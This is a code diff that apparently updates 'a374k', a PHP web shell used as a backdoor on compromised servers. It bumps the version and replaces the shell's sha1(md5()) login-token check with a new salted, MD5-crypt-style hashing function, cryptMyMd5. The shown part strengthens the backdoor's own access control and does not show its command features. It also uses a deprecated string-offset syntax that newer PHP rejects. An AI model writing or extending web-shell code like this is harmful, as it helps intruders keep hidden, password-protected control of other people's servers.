@@ -1,5 +1,5 @@
 <?php
-$GLOBALS['ver'] = "4.0.2";
+$GLOBALS['ver'] = "4.0.3";
 $GLOBALS['title'] = "a374k";
 
 @ob_start();
@@ -17,7 +17,7 @@ if(!function_exists('auth')){
 			$c = $_COOKIE;
 			$p = $_POST;
 			if(isset($p['token'])){
-				$token = sha1(md5($p['token']));
+			    $token = cryptMyMd5($p['token'], explode('#', $GLOBALS['token'])[0]);
 				if($token==$GLOBALS['token']){
 					setcookie("token", $token, time()+36000, "/");
 					header("Location: ".get_self());
@@ -1083,6 +1083,45 @@ if(!function_exists('file_icon')) {
             }
         }
         return "<img src='".$img."'>";
+    }
+}
+
+if(!function_exists('cryptMyMd5')) {
+    function cryptMyMd5($input, $extra_salt = null)
+    {
+        $salt = $extra_salt == null ? substr(str_shuffle("abcdefghijklmnopqrstuvwxyz0123456789"), 0, 8) : $extra_salt;
+        $len = strlen($input);
+        $text = $input . '$a374k$' . $salt;
+        $bin = pack("H32", md5($input . $salt . $input));
+        for ($i = $len; $i > 0; $i -= 16) {
+            $text .= substr($bin, 0, min(16, $i));
+        }
+        for ($i = $len; $i > 0; $i >>= 1) {
+            $text .= ($i & 1) ? chr(0) : $input{0};
+        }
+        $bin = pack("H32", md5($text));
+        for ($i = 0; $i < 1000; $i++) {
+            $new = ($i & 1) ? $input : $bin;
+            if ($i % 3) $new .= $salt;
+            if ($i % 7) $new .= $input;
+            $new .= ($i & 1) ? $bin : $input;
+            $bin = pack("H32", md5($new));
+        }
+        $tmp = '';
+        for ($i = 0; $i < 5; $i++) {
+            $k = $i + 6;
+            $j = $i + 12;
+            if ($j == 16) $j = 5;
+            $tmp = $bin[$i] . $bin[$k] . $bin[$j] . $tmp;
+        }
+        $tmp = chr(0) . chr(0) . $bin[11] . $tmp;
+        $tmp = base64_encode($tmp);
+        $tmp = substr($tmp, 2);
+        $tmp = strrev($tmp);
+        $tmp = strtr($tmp,
+            "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/",
+            "./0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz");
+        return $salt . "#" . $tmp;
     }
 }
 ?>
